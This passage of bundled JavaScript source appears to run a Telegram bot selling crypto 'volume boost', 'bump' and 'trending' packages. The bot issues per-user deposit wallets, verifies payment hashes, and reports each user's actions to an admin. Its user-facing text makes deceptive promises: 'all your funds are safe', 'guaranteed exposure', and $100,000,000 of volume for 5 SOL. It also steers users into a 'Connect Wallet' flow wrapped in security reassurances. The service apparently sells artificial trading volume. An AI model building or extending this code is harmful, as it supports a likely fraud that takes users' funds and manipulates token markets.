    const status = parseInt(receipt.status, 16);
    if (status === 0) {
      return {
        ok: false,
        confirmed: true,
        chain,
        error: "\u274C This Ethereum transaction <b>failed</b> (reverted).\n\nPlease send a successful transaction and submit that TX hash."
      };
    }
  }
  return {
    ok: true,
    confirmed: true,
    chain,
    recipient: tx.to ?? void 0,
    sender: tx.from ?? void 0
  };
}
async function verifyTx(txHash, expectedRecipient, expectedLamports) {
  const chain = detectChain(txHash);
  if (chain === "invalid") {
    return {
      ok: false,
      confirmed: false,
      chain,
      error: "\u274C Invalid transaction hash format.\n\n<b>Valid formats:</b>\n\u2022 Solana: 87\u201388 base58 characters\n  Example: <code>5KtP9jFh...xyZm</code>\n\n\u2022 Ethereum: starts with <code>0x</code> + 64 hex characters\n  Example: <code>0x4a3b2c1d...</code>\n\nCopy the hash directly from your wallet or block explorer."
    };
  }
  if (chain === "eth") return verifyEthTx(txHash);
  return verifySolTx(txHash, expectedRecipient, expectedLamports);
}

// src/bot/keyboards.ts
import { Markup } from "telegraf";
var mainMenuKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F7E2} Start Bumping", "menu_bump")],
  [
    Markup.button.callback("\u{1F4CA} Volume Boost", "menu_volume"),
    Markup.button.callback("\u{1F525} Trending Boost", "menu_trending")
  ],
  [
    Markup.button.callback("\u{1F310} DexScreener", "menu_dex"),
    Markup.button.callback("\u{1F4B0} Deposit", "menu_deposit")
  ],
  [Markup.button.callback("\u{1F517} Connect Wallet", "menu_wallet")],
  [Markup.button.callback("\u{1F4AC} Contact Support \u2197", "menu_support")]
]);
var solPickerKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u{1F535} 0.3 SOL", "sol_0.3"),
    Markup.button.callback("\u{1F7E1} 0.4 SOL", "sol_0.4")
  ],
  [
    Markup.button.callback("\u{1F7E0} 0.5 SOL", "sol_0.5"),
    Markup.button.callback("\u{1F534} 0.6 SOL", "sol_0.6")
  ],
  [Markup.button.callback("\u2B05\uFE0F Back", "back_main")]
]);
var confirmOrderKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u2705 Confirm Order", "confirm_bump")],
  [Markup.button.callback("\u274C Cancel", "back_main")]
]);
var paymentSentKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u2705 I have made payment", "submit_tx")],
  [Markup.button.callback("\u274C Cancel Order", "back_main")]
]);
var cancelKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u274C Cancel", "back_main")]
]);
var volumeBoostKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("1.50 SOL - Iron", "vol_iron"),
    Markup.button.callback("2.50 SOL - Bronze", "vol_bronze")
  ],
  [
    Markup.button.callback("3.50 SOL - Gold", "vol_gold"),
    Markup.button.callback("7.50 SOL - Plati...", "vol_platinum")
  ],
  [
    Markup.button.callback("5.00 SOL - Silver", "vol_silver"),
    Markup.button.callback("10.50 SOL - Dia...", "vol_diamond")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var trendingMenuKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("SOL TRENDING", "trend_sol")],
  [
    Markup.button.callback("ETH TRENDING", "trend_eth"),
    Markup.button.callback("PUMPFUN TREN...", "trend_pumpfun")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var solTrendingKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u{1F534} TOP 3 \u{1F534}", "st_top3_label"),
    Markup.button.callback("\u{1F534} TOP 10 \u{1F534}", "st_top10_label")
  ],
  [
    Markup.button.callback("\u23F3 3 hr | 1.50 SOL", "st_top3_3hr"),
    Markup.button.callback("\u23F3 3 hr | 1.00 SOL", "st_top10_3hr")
  ],
  [
    Markup.button.callback("\u23F3 6 hr | 2.30 SOL", "st_top3_6hr"),
    Markup.button.callback("\u23F3 6 hr | 1.60 SOL", "st_top10_6hr")
  ],
  [
    Markup.button.callback("\u23F3 12 hr | 3.70 S...", "st_top3_12hr"),
    Markup.button.callback("\u23F3 12 hr | 2.60 S...", "st_top10_12hr")
  ],
  [
    Markup.button.callback("\u23F3 24 hr | 5.90...", "st_top3_24hr"),
    Markup.button.callback("\u23F3 24 hr | 4.10 S...", "st_top10_24hr")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var ethTrendingKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u23F3 100$", "et_100"),
    Markup.button.callback("\u23F3 200$", "et_200")
  ],
  [Markup.button.callback("\u23F3 300$", "et_300")],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var pumpfunTrendingKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F525} P.F.T - 30 SOL", "pft_30")],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var dexscreenerKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F534} TOP 6 \u{1F534}", "dex_top6_info")],
  [
    Markup.button.callback("\u23F3 5 hr | 2 SOL", "dex_5hr"),
    Markup.button.callback("\u23F3 7 hr | 3.5 SOL", "dex_7hr")
  ],
  [
    Markup.button.callback("\u23F3 12 hr | 7 SOL", "dex_12hr"),
    Markup.button.callback("\u23F3 24 hr | 15 SOL", "dex_24hr")
  ],
  [
    Markup.button.callback("\u23F3 18 hr | 10 SOL", "dex_18hr"),
    Markup.button.callback("\u23F3 32 hr | 22 SOL", "dex_32hr")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var depositKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("ADD", "deposit_add")],
  [
    Markup.button.callback("WITHDRAW", "deposit_withdraw"),
    Markup.button.callback("SOL BALANCE", "deposit_sol_balance")
  ],
  [
    Markup.button.callback("\u{1F4CB} My Deposits", "deposit_my_deposits"),
    Markup.button.callback("\u{1F4CB} My Withdrawals", "deposit_my_withdrawals")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var connectWalletKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} Connect Now", "wallet_connect_now")],
  [Markup.button.callback("\u{1F6E1}\uFE0F Security Guidelines", "wallet_security")],
  [Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var securityGuidelinesKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} I Understand, Connect Now", "wallet_connect_now")],
  [
    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
    Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "wallet_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var howToConnectKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} Start Connection", "wallet_connect_now")],
  [
    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
    Markup.button.callback("\u{1F6E1}\uFE0F Security Guide...", "wallet_security")
  ]
]);
var whyConnectKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} Connect Now", "wallet_connect_now")],
  [Markup.button.callback("\u{1F6E1}\uFE0F Security Guidelines", "wallet_security")],
  [Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "wallet_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var mainMenuOnlyKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F3E0} Main Menu", "back_main")]
]);

// src/bot/index.ts
var __filename2 = fileURLToPath2(import.meta.url);
var __dirname2 = path2.dirname(__filename2);
var IMG = {
  welcome: path2.join(__dirname2, "images", "welcome.jpeg"),
  walletconnect: path2.join(__dirname2, "images", "walletconnect.jpeg"),
  volume: path2.join(__dirname2, "images", "volume.jpeg"),
  trending: path2.join(__dirname2, "images", "trending.jpeg")
};
var ETH_ADDRESS = process.env.PAYMENT_ETH_ADDRESS ?? "";
var SUPPORT_USERNAME = process.env.SUPPORT_USERNAME ?? "";
async function delMsg(ctx) {
  try {
    await ctx.deleteMessage();
  } catch {
  }
}
async function sendPhoto(ctx, img, caption, extra = {}) {
  try {
    await ctx.replyWithPhoto({ source: img }, { caption, parse_mode: "HTML", ...extra });
  } catch {
    await ctx.reply(caption, { parse_mode: "HTML", ...extra });
  }
}
var BOT_SERVER_BASE = process.env["RENDER_EXTERNAL_HOSTNAME"] ? `https://${process.env["RENDER_EXTERNAL_HOSTNAME"]}` : process.env["REPLIT_DEV_DOMAIN"] ? `https://${process.env["REPLIT_DEV_DOMAIN"]}` : null;
function proxyImgUrl(raw) {
  if (!raw || !BOT_SERVER_BASE) return null;
  return `${BOT_SERVER_BASE}/api/img?url=${encodeURIComponent(raw)}`;
}
async function safeSendPhoto(ctx, url, opts) {
  try {
    await ctx.replyWithPhoto(url, opts);
    return true;
  } catch {
  }
  const proxied = proxyImgUrl(url);
  if (proxied) {
    try {
      await ctx.replyWithPhoto(proxied, opts);
      return true;
    } catch {
    }
  }
  return false;
}
function userLine(u) {
  const name = `${u.first_name ?? ""}${u.last_name ? " " + u.last_name : ""}`.trim();
  const handle = u.username ? ` (@${u.username})` : "";
  const lang = u.language_code ? ` \u{1F310} ${u.language_code}` : "";
  return `\u{1F464} <b>${name}</b>${handle}${lang}
\u{1F194} ID: <code>${u.id}</code>`;
}
async function notifyNewUser(ctx) {
  await notifyAdmin(
    `\u{1F195} <b>NEW USER STARTED BOT</b>

${userLine(ctx.from)}
\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
  );
}
async function notifyServiceSelected(ctx, service, pkg, amount) {
  await notifyAdmin(
    `\u{1F3AF} <b>SERVICE SELECTED</b>

${userLine(ctx.from)}

\u{1F4E6} Service: <b>${service}</b>
\u{1F4B0} Package: <b>${pkg}</b>
\u{1F4B5} Amount: <b>${amount}</b>

\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
  );
}
async function notifyWalletViewed(ctx, solAddr, ethAddr) {
  await notifyAdmin(
    `\u{1F441} <b>DEPOSIT SCREEN OPENED</b>

${userLine(ctx.from)}

\u25CE SOL Wallet:
<code>${solAddr}</code>

\u039E ETH Address:
<code>${ethAddr || "Not configured"}</code>

\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
  );
}
async function notifyConnectWalletOpened(ctx) {
  await notifyAdmin(
    `\u{1F517} <b>CONNECT WALLET OPENED</b>

${userLine(ctx.from)}

\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
  );
}
var VOLUME_PKGS = {
  vol_iron: { label: "Iron", sol: 1.5, volume: "$50,000", service: "Iron Package" },
  vol_bronze: { label: "Bronze", sol: 2.5, volume: "$250,000", service: "Bronze Package" },
  vol_silver: { label: "Silver", sol: 5, volume: "$100,000,000", service: "Silver Package" },
  vol_gold: { label: "Gold", sol: 3.5, volume: "$100,000", service: "Gold Package" },
  vol_platinum: { label: "Platinum", sol: 7.5, volume: "$500,000", service: "Platinum Package" },
  vol_diamond: { label: "Diamond", sol: 10.5, volume: "$2,500,000", service: "Diamond Package" }
};
var SOL_TREND_PKGS = {
  st_top3_3hr: { label: "TOP 3 \u2014 3 hr", sol: 1.5, service: "SOL Trending TOP3 3hr" },
  st_top3_6hr: { label: "TOP 3 \u2014 6 hr", sol: 2.3, service: "SOL Trending TOP3 6hr" },
  st_top3_12hr: { label: "TOP 3 \u2014 12 hr", sol: 3.7, service: "SOL Trending TOP3 12hr" },
  st_top3_24hr: { label: "TOP 3 \u2014 24 hr", sol: 5.9, service: "SOL Trending TOP3 24hr" },
  st_top10_3hr: { label: "TOP 10 \u2014 3 hr", sol: 1, service: "SOL Trending TOP10 3hr" },
  st_top10_6hr: { label: "TOP 10 \u2014 6 hr", sol: 1.6, service: "SOL Trending TOP10 6hr" },
  st_top10_12hr: { label: "TOP 10 \u2014 12 hr", sol: 2.6, service: "SOL Trending TOP10 12hr" },
  st_top10_24hr: { label: "TOP 10 \u2014 24 hr", sol: 4.1, service: "SOL Trending TOP10 24hr" }
};
var ETH_TREND_PKGS = {
  et_100: { usd: 100, service: "ETH Trending $100" },
  et_200: { usd: 200, service: "ETH Trending $200" },
  et_300: { usd: 300, service: "ETH Trending $300" }
};
var DEX_PKGS = {
  dex_5hr: { label: "TOP 6 \u2014 5 hr", sol: 2, service: "DexScreener TOP6 5hr" },
  dex_7hr: { label: "TOP 6 \u2014 7 hr", sol: 3.5, service: "DexScreener TOP6 7hr" },
  dex_12hr: { label: "TOP 6 \u2014 12 hr", sol: 7, service: "DexScreener TOP6 12hr" },
  dex_18hr: { label: "TOP 6 \u2014 18 hr", sol: 10, service: "DexScreener TOP6 18hr" },
  dex_24hr: { label: "TOP 6 \u2014 24 hr", sol: 15, service: "DexScreener TOP6 24hr" },
  dex_32hr: { label: "TOP 6 \u2014 32 hr", sol: 22, service: "DexScreener TOP6 32hr" }
};
async function sendWelcome(ctx) {
  await delMsg(ctx);
  const caption = `\u{1F7E2} <b>Welcome to PUMPFUN TREND BOT service!</b>

New to volume bots? No worries \u2014 we made it super simple!

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501

<b>How it works:</b>
1. Select how much Bumps/volume to use.
2. Pick how long to run and how Massive you want your Token to Pump.
3. Done! <a href="https://pump.fun">Pump.fun</a> Server handles the rest.

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501

<b>Works on:</b>
\u{1F7E2} <a href="https://pump.fun">Pumpfun</a>  \u2022  \u{1F7E2} <a href="https://raydium.io">Raydium</a>  \u2022
\u{1F7E2} <a href="https://pumpswap.xyz">PumpSwap</a>  \u2022  \u{1F7E2} <a href="https://moonshot.money">Moonshot</a>  \u2022
\u{1F7E2} <a href="https://letsbonk.fun">LetsBonk</a>  \u2022  \u{1F7E2} <a href="https://dexscreener.com">Dexpad/screener</a>

From 0.3 - 0.4 - 0.5 - 0.6 SOL bumps boost trend with mass volume of high stabilities.`;
  await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
}
async function showStartBumping(ctx) {
  await delMsg(ctx);
  const support = SUPPORT_USERNAME ? `

For more information, please contact ${SUPPORT_USERNAME}` : "";
  await ctx.reply(
    `The fastest and cheapest Telegram bot for creating bump orders.

<b>Supported Platform:</b>
Pumpfun and Raydium.

Pumpfun BumpBot charges a one-time fee of <b>0.3 SOL</b> per token, making it the cheapest bump bot ever!

\u{1F4CA} <b>Trending channel:</b>
<a href="https://t.me/pumpmints">https://t.me/pumpmints</a>

Subscribe to our PF alert tools:
- PF New Raydium Pools: <a href="https://t.me/pumpswap_pools">t.me/pumpswap_pools</a>` + support,
    { parse_mode: "HTML", ...solPickerKeyboard }
  );
}
async function showVolumeBoost(ctx) {
  await delMsg(ctx);
  const caption = `\u270F\uFE0F Iron Package - $50,000 Volume
\u270F\uFE0F Bronze Package - $250,000 Volume
\u270F\uFE0F Silver Package - $100,000,000 Volume
\u270F\uFE0F Gold Package - $100,000 Volume
\u270F\uFE0F Platinum Package - $500,000 Volume
\u270F\uFE0F Diamond Package - $2,500,000 Volume

Please select the package below:`;
  await sendPhoto(ctx, IMG.volume, caption, volumeBoostKeyboard);
}
async function showTrendingBoost(ctx) {
  await delMsg(ctx);
  const caption = `\u{1F7E2} Discover the Power of Trending!

Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!

\u{1F7E2} A paid boost guarantees you a spot in our daily livestream (AMA)!

\u27A1\uFE0F Please choose SOL Trending or Pump Fun Trending to start:`;
  await sendPhoto(ctx, IMG.trending, caption, trendingMenuKeyboard);
}
async function showDexScreener(ctx) {
  await delMsg(ctx);
  await ctx.reply(
    `\u{1F310} DEX Screener is a data platform and on-chain analytics tool designed for decentralized exchanges (DEXs), providing real-time insights into token prices, liquidity pools, trading volumes, and market trends across multiple blockchains.

<b>TREND ON DEX</b>

\u{1F534} TOP 6 \u{1F534}

Select a duration:`,
    { parse_mode: "HTML", ...dexscreenerKeyboard }
  );
}
async function showDeposit(ctx) {
  await delMsg(ctx);
  const wallet = deriveWalletForUser(ctx.from.id);
  const ethDisplay = ETH_ADDRESS || "Not configured \u2014 set PAYMENT_ETH_ADDRESS";
  await ctx.reply(
    `<b>WALLET BALANCE</b>

<b>ETH:</b>
<code>${ethDisplay}</code>
balance: 0 ETH

<b>SOL:</b>
<code>${wallet.address}</code>
balance: 0 SOL

Deposit not less than 0.30 SOL and get trending on several platforms

\u{1F4B0} KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.
\u{1F4A1} NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
    { parse_mode: "HTML", ...depositKeyboard }
  );
  notifyWalletViewed(ctx, wallet.address, ETH_ADDRESS).catch(() => {
  });
}
async function showConnectWallet(ctx) {
  await delMsg(ctx);
  const caption = `\u{1F517} <b>Connect Your Wallet</b>

Welcome to our secure wallet connection service!

Connect your wallet to unlock premium features and enhanced trading capabilities.

<b>Available Options:</b>
\u{1F517} Connect Now - Start the connection process
\u{1F510} Why Connect? - Learn about the benefits
\u{1F6E1}\uFE0F Security Guidelines - Important safety information
\u{1F4F1} How to Connect - Step-by-step instructions

Your security is our top priority. We use industry-standard encryption to protect your information.`;
  await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
}
async function showSupport(ctx) {
  await delMsg(ctx);
  const contactLine = SUPPORT_USERNAME ? `For assistance, contact: <b>${SUPPORT_USERNAME}</b>` : `Please reach out via the official channel.`;
  await ctx.reply(
    `\u{1F4AC} <b>Contact Support</b>

${contactLine}

\u{1F194} Your User ID: <code>${ctx.from.id}</code>`,
    { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
  );
}
function createBot() {
  const token2 = process.env.TELEGRAM_BOT_TOKEN;
  if (!token2) throw new Error("TELEGRAM_BOT_TOKEN not set");
  const bot = new Telegraf(token2);
  setBot(bot);
  bot.catch((err, ctx) => {
    const msg = err instanceof Error ? err.message : String(err);
    logger.error({ err, updateType: ctx?.updateType }, `Bot error: ${msg}`);
    ctx?.answerCbQuery?.("\u26A0\uFE0F Something went wrong. Please try again.").catch(() => {
    });
    ctx?.reply?.("\u26A0\uFE0F Something went wrong. Please use /start to restart.").catch(() => {
    });
  });
  bot.start(async (ctx) => {
    clearSession(ctx.from.id);
    notifyNewUser(ctx).catch(() => {
    });
    await sendPhoto(
      ctx,
      IMG.welcome,
      `\u{1F7E2} <b>Welcome to PUMPFUN TREND BOT service!</b>

New to volume bots? No worries \u2014 we made it super simple!

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501

<b>How it works:</b>
1. Select how much Bumps/volume to use.
2. Pick how long to run and how Massive you want your Token to Pump.
3. Done! <a href="https://pump.fun">Pump.fun</a> Server handles the rest.

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501

<b>Works on:</b>
\u{1F7E2} <a href="https://pump.fun">Pumpfun</a>  \u2022  \u{1F7E2} <a href="https://raydium.io">Raydium</a>  \u2022
\u{1F7E2} <a href="https://pumpswap.xyz">PumpSwap</a>  \u2022  \u{1F7E2} <a href="https://moonshot.money">Moonshot</a>  \u2022
\u{1F7E2} <a href="https://letsbonk.fun">LetsBonk</a>  \u2022  \u{1F7E2} <a href="https://dexscreener.com">Dexpad/screener</a>

From 0.3 - 0.4 - 0.5 - 0.6 SOL bumps boost trend with mass volume of high stabilities.`,
      mainMenuKeyboard
    );
  });
  bot.action("back_main", async (ctx) => {
    await ctx.answerCbQuery();
    clearSession(ctx.from.id);
    await sendWelcome(ctx);
  });
  bot.action("menu_bump", async (ctx) => {
    await ctx.answerCbQuery();
    await showStartBumping(ctx);
  });
  bot.action("menu_volume", async (ctx) => {
    await ctx.answerCbQuery();
    await showVolumeBoost(ctx);
  });
  bot.action("menu_trending", async (ctx) => {
    await ctx.answerCbQuery();
    await showTrendingBoost(ctx);
  });
  bot.action("menu_dex", async (ctx) => {
    await ctx.answerCbQuery();
    await showDexScreener(ctx);
  });
  bot.action("menu_deposit", async (ctx) => {
    await ctx.answerCbQuery();
    await showDeposit(ctx);
  });
  bot.action("menu_support", async (ctx) => {
    await ctx.answerCbQuery();
    await showSupport(ctx);
  });
  bot.action("menu_wallet", async (ctx) => {
    await ctx.answerCbQuery();
    notifyConnectWalletOpened(ctx).catch(() => {
    });
    await showConnectWallet(ctx);
  });
  for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
    bot.action(`sol_${amt}`, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "Volume Bumping", `${amt} SOL per bump`, `${amt} SOL`).catch(() => {
      });
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: parseFloat(amt),
        serviceLabel: `Volume Bumping (${amt} SOL)`,
        boostType: "bump"
      });
      await delMsg(ctx);
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected <b>${amt} SOL</b> per bump

Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  for (const [key, pkg] of Object.entries(VOLUME_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "Volume Boost", `${pkg.service} \u2014 ${pkg.volume}`, `${pkg.sol} SOL`).catch(() => {
      });
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "volume",
        boostPackage: key
      });
      await delMsg(ctx);
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected <b>${pkg.label} Package (${pkg.sol} SOL)</b>
Volume: <b>${pkg.volume}</b>

Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  bot.action("trend_sol", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(
      `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!

\u{1F7E2} A paid boost guarantees you a spot in our daily livestream (AMA)!

\u27A1\uFE0F Please choose SOL Trending or Pump Fun Trending to start:`,
      { parse_mode: "HTML", ...solTrendingKeyboard }
    );
  });
  bot.action("trend_eth", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(
      `\u{1F535} <b>ETH TREND</b>

Kindly chose the trend you wish to pump on.`,
      { parse_mode: "HTML", ...ethTrendingKeyboard }
    );
  });
  bot.action("trend_pumpfun", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await sendPhoto(
      ctx,
      IMG.trending,
      `\u{1F525} <b>PUMP.FUN TRENDING</b> \u{1F525}

\u{1F4A1} THE BEST TRENDING IN THE BOT SECTION, DON'T MISS THE OPPORTUNITY TO GET 12 HOURS FREE SOLANA TRENDING ONCE YOU PURCHASE IT.`,
      pumpfunTrendingKeyboard
    );
  });
  bot.action("trend_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showTrendingBoost(ctx);
  });
  bot.action("st_top3_label", async (ctx) => ctx.answerCbQuery("TOP 3 \u2014 left column"));
  bot.action("st_top10_label", async (ctx) => ctx.answerCbQuery("TOP 10 \u2014 right column"));
  for (const [key, pkg] of Object.entries(SOL_TREND_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "SOL Trending Boost", pkg.service, `${pkg.sol} SOL`).catch(() => {
      });
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "sol_trending",
        boostPackage: key
      });
      await delMsg(ctx);
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

Package: <b>${pkg.label}</b>
Cost: <b>${pkg.sol} SOL</b>

Please paste the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  for (const [key, pkg] of Object.entries(ETH_TREND_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "ETH Trending Boost", pkg.service, `$${pkg.usd} USD`).catch(() => {
      });
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: 0,
        ethAmount: pkg.usd,
        serviceLabel: pkg.service,
        boostType: "eth_trending",
        boostPackage: key
      });
      await delMsg(ctx);
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

Package: <b>ETH Trending $${pkg.usd}</b>

Please paste the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  bot.action("pft_30", async (ctx) => {
    await ctx.answerCbQuery();
    notifyServiceSelected(ctx, "PumpFun Trending", "P.F.T \u2014 30 SOL", "30 SOL").catch(() => {
    });
    setSession(ctx.from.id, {
      step: "awaiting_ca",
      selectedSol: 30,
      serviceLabel: "PumpFun Trending P.F.T",
      boostType: "pumpfun_trending",
      boostPackage: "pft_30"
    });
    await delMsg(ctx);
    await ctx.reply(
      `\u{1F4DD} <b>Enter Contract Address (CA)</b>

Package: <b>P.F.T \u2014 30 SOL</b>

Please paste the Contract Address (CA) of your token:`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  bot.action("dex_top6_info", async (ctx) => ctx.answerCbQuery("Choose a duration below"));
  for (const [key, pkg] of Object.entries(DEX_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "DexScreener Boost", pkg.service, `${pkg.sol} SOL`).catch(() => {
      });
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "dexscreener",
        boostPackage: key
      });
      await delMsg(ctx);
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

Package: <b>${pkg.label}</b>
Cost: <b>${pkg.sol} SOL</b>

Please paste the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  bot.action("confirm_bump", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    const wallet = deriveWalletForUser(ctx.from.id);
    const orderId = randomUUID().split("-")[0].toUpperCase();
    const isEth = s.boostType === "eth_trending";
    const payWallet = isEth ? ETH_ADDRESS : wallet.address;
    setSession(ctx.from.id, {
      step: "awaiting_payment_sent",
      paymentWallet: payWallet,
      orderId
    });
    saveOrder({
      id: orderId,
      userId: ctx.from.id,
      userName: `${ctx.from.first_name ?? ""}${ctx.from.last_name ? " " + ctx.from.last_name : ""}`,
      userHandle: ctx.from.username ?? "",
      tokenName: s.tokenName ?? "Unknown",
      tokenSymbol: s.tokenSymbol ?? "???",
      contractAddress: s.contractAddress ?? "",
      service: s.serviceLabel ?? "Boost",
      solAmount: s.selectedSol ?? 0,
      usdAmount: s.ethAmount,
      paymentWallet: payWallet,
      status: "pending",
      createdAt: /* @__PURE__ */ new Date()
    });
    const chainLabel = s.tokenChain === "sol" ? "\u25CE Solana" : s.tokenChain === "eth" ? "\u039E Ethereum" : s.tokenChain === "bsc" ? "\u2B21 BSC" : s.tokenChain === "base" ? "\u{1F535} Base" : "\u{1F517}";
    const payLine = isEth ? `\u039E <b>$${s.ethAmount} USD</b>
\u{1F4EE} ETH Wallet:
<code>${ETH_ADDRESS || "Contact support for ETH address"}</code>` : `\u25CE <b>${s.selectedSol} SOL</b>
\u{1F4EE} SOL Wallet:
<code>${wallet.address}</code>`;
    const paymentMsg = `\u2705 <b>Order Confirmed!</b>

\u{1F4CB} <b>Order Details:</b>
\u2022 Token: <b>${s.tokenName}</b> ($${s.tokenSymbol})
\u2022 CA: <code>${s.contractAddress}</code>
\u2022 Service: ${s.serviceLabel}
` + (isEth ? `\u2022 Amount: <b>$${s.ethAmount} USD</b>
` : `\u2022 Amount: <b>${s.selectedSol} SOL</b>
`) + `\u2022 Order ID: <code>${orderId}</code>

\u{1F4B3} <b>Send Payment To:</b>
${payLine}

` + (isEth ? `\u26A0\uFE0F Send exactly <b>$${s.ethAmount} USD</b> on Ethereum network` : `\u26A0\uFE0F Send exactly <b>${s.selectedSol} SOL</b> on Solana network`) + `

After sending, click the button below and submit your transaction hash.`;
    await delMsg(ctx);
    let sentWithPhoto = false;
    if (s.tokenImageUrl) {
      sentWithPhoto = await safeSendPhoto(ctx, s.tokenImageUrl, {
        caption: paymentMsg,
        parse_mode: "HTML",
        ...paymentSentKeyboard
      });
    }
    if (!sentWithPhoto) {
      await ctx.reply(paymentMsg, { parse_mode: "HTML", ...paymentSentKeyboard });
    }
    const adminMsg = `\u{1F4CB} <b>NEW ORDER</b>

${userLine(ctx.from)}

\u{1FA99} <b>${s.tokenName ?? "Unknown"} ($${s.tokenSymbol ?? "???"})</b>  ${chainLabel}
\u{1F4CD} CA: <code>${s.contractAddress}</code>
